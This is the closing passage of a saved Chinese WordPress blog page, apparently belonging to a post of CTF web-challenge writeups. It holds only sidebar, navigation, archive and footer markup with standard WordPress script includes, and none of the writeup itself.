</div><!-- .comments-area -->
<nav class="navigation post-navigation" role="navigation">
<h2 class="screen-reader-text">文章导航</h2>
<div class="nav-links"><div class="nav-previous"><a href="http://www.melodia.pw/?p=730" rel="prev"><span aria-hidden="true" class="meta-nav">上一</span> <span class="screen-reader-text">上篇文章：</span> <span class="post-title">LCTF 2016 WEB Writeup</span></a></div><div class="nav-next"><a href="http://www.melodia.pw/?p=771" rel="next"><span aria-hidden="true" class="meta-nav">下一</span> <span class="screen-reader-text">下篇文章：</span> <span class="post-title">Boston Key Party 2017 writeup</span></a></div></div>
</nav>
</main><!-- .site-main -->
<aside class="content-bottom-widgets" id="content-bottom-widgets" role="complementary">
<div class="widget-area">
<section class="widget widget_text" id="text-2"> <div class="textwidget"></div>
</section> </div><!-- .widget-area -->
</aside><!-- .content-bottom-widgets -->
</div><!-- .content-area -->
<aside class="sidebar widget-area" id="secondary" role="complementary">
<section class="widget widget_search" id="search-2">
<form action="http://www.melodia.pw/" class="search-form" method="get" role="search">
<label>
<span class="screen-reader-text">搜索：</span>
<input class="search-field" name="s" placeholder="搜索…" type="search" value=""/>
</label>
<button class="search-submit" type="submit"><span class="screen-reader-text">搜索</span></button>
</form>
</section> <section class="widget widget_recent_entries" id="recent-posts-2"> <h2 class="widget-title">近期文章</h2> <ul>
<li>
<a href="http://www.melodia.pw/?p=895">简单谈谈过去一年看得动漫</a>
</li>
<li>
<a href="http://www.melodia.pw/?p=889">0ctf 2017 quals web writeup</a>
</li>
<li>
<a href="http://www.melodia.pw/?p=771">Boston Key Party 2017 writeup</a>
</li>
<li>
<a href="http://www.melodia.pw/?p=743">HITCON 2016 WEB WRITEUP[2016.10.12已更新web500]</a>
</li>
<li>
<a href="http://www.melodia.pw/?p=730">LCTF 2016 WEB Writeup</a>
</li>
</ul>
</section> <section class="widget widget_recent_comments" id="recent-comments-2"><h2 class="widget-title">近期评论</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://www.netsec0day.com/?p=294" rel="external nofollow">半月安全看看看第四期 – 安全0day</a></span>发表在《<a href="http://www.melodia.pw/?p=889#comment-257433">0ctf 2017 quals web writeup</a>》</li><li class="recentcomments"><span class="comment-author-link">Melody</span>发表在《<a href="http://www.melodia.pw/?p=889#comment-257432">0ctf 2017 quals web writeup</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://blog.albertchang.cn" rel="external nofollow">albertchang</a></span>发表在《<a href="http://www.melodia.pw/?p=889#comment-257419">0ctf 2017 quals web writeup</a>》</li><li class="recentcomments"><span class="comment-author-link">jjj</span>发表在《<a href="http://www.melodia.pw/?p=889#comment-257418">0ctf 2017 quals web writeup</a>》</li><li class="recentcomments"><span class="comment-author-link">Melody</span>发表在《<a href="http://www.melodia.pw/?p=889#comment-257417">0ctf 2017 quals web writeup</a>》</li></ul></section><section class="widget widget_links" id="linkcat-0"><h2 class="widget-title">书签</h2>
<ul class="xoxo blogroll">
<li><a href="http://aklis.info">Aklis</a></li>
<li><a href="http://blog.albertchang.cn">albertchang</a></li>
<li><a href="http://blog.cal1.cn/" target="_blank" title="社会我猫哥">CurseRed</a></li>
<li><a href="http://www.venenof.com/" target="_blank">Veneno</a></li>
<li><a href="https://www.virzz.com/">Virink</a></li>
</ul>
</section>
<section class="widget widget_archive" id="archives-2"><h2 class="widget-title">文章归档</h2> <ul>
<li><a href="http://www.melodia.pw/?m=201704">2017年四月</a></li>
<li><a href="http://www.melodia.pw/?m=201703">2017年三月</a></li>
<li><a href="http://www.melodia.pw/?m=201702">2017年二月</a></li>
<li><a href="http://www.melodia.pw/?m=201610">2016年十月</a></li>
<li><a href="http://www.melodia.pw/?m=201605">2016年五月</a></li>
<li><a href="http://www.melodia.pw/?m=201602">2016年二月</a></li>
<li><a href="http://www.melodia.pw/?m=201208">2012年八月</a></li>
<li><a href="http://www.melodia.pw/?m=201207">2012年七月</a></li>
<li><a href="http://www.melodia.pw/?m=201109">2011年九月</a></li>
<li><a href="http://www.melodia.pw/?m=201108">2011年八月</a></li>
<li><a href="http://www.melodia.pw/?m=201106">2011年六月</a></li>
<li><a href="http://www.melodia.pw/?m=201104">2011年四月</a></li>
<li><a href="http://www.melodia.pw/?m=201103">2011年三月</a></li>
</ul>
</section><section class="widget widget_categories" id="categories-2"><h2 class="widget-title">分类目录</h2> <ul>
<li class="cat-item cat-item-1"><a href="http://www.melodia.pw/?cat=1">未分类</a>
</li>
<li class="cat-item cat-item-2"><a href="http://www.melodia.pw/?cat=2">每刻，知识分享</a>
</li>
<li class="cat-item cat-item-5"><a href="http://www.melodia.pw/?cat=5">每日，寻寻觅觅</a>
</li>
<li class="cat-item cat-item-6"><a href="http://www.melodia.pw/?cat=6">每时，走走停停</a>
</li>
</ul>
</section><section class="widget widget_meta" id="meta-2"><h2 class="widget-title">功能</h2> <ul>
<li><a href="http://www.melodia.pw/wp-login.php">登录</a></li>
<li><a href="http://www.melodia.pw/?feed=rss2">文章<abbr title="Really Simple Syndication">RSS</abbr></a></li>
<li><a href="http://www.melodia.pw/?feed=comments-rss2">评论<abbr title="Really Simple Syndication">RSS</abbr></a></li>
<li><a href="https://cn.wordpress.org/" title="基于WordPress，一个优美、先进的个人信息发布平台。">WordPress.org</a></li> </ul>
</section> </aside><!-- .sidebar .widget-area -->
</div><!-- .site-content -->
<footer class="site-footer" id="colophon" role="contentinfo">
<nav aria-label="页脚主菜单" class="main-navigation" role="navigation">
<div class="menu-%e9%a1%b5%e9%9d%a2-container"><ul class="primary-menu" id="menu-%e9%a1%b5%e9%9d%a2-1"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-688"><a href="http://www.melodia.pw/?page_id=5">About</a></li>
</ul></div> </nav><!-- .main-navigation -->
<div class="site-info">
<span class="site-title"><a href="http://www.melodia.pw/" rel="home">Melody有奥妙</a></span>
<a href="https://cn.wordpress.org/">自豪地采用WordPress</a>
</div><!-- .site-info -->
</footer><!-- .site-footer -->
</div><!-- .site-inner -->
</div><!-- .site -->
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/form.jsver=3.3.1" type="text/javascript"></script>
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/skip-link-focus-fix.jsver=20160816" type="text/javascript"></script>
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/comment-reply.min.jsver=4.7.5" type="text/javascript"></script>
<script type="text/javascript">
/* <![CDATA[ */
var screenReaderText = {"expand":"\u5c55\u5f00\u5b50\u83dc\u5355","collapse":"\u6298\u53e0\u5b50\u83dc\u5355"};
/* ]]> */
</script>
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/functions.jsver=20160816" type="text/javascript"></script>
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/wp-embed.min.jsver=4.7.5" type="text/javascript"></script>
</body>
</html>
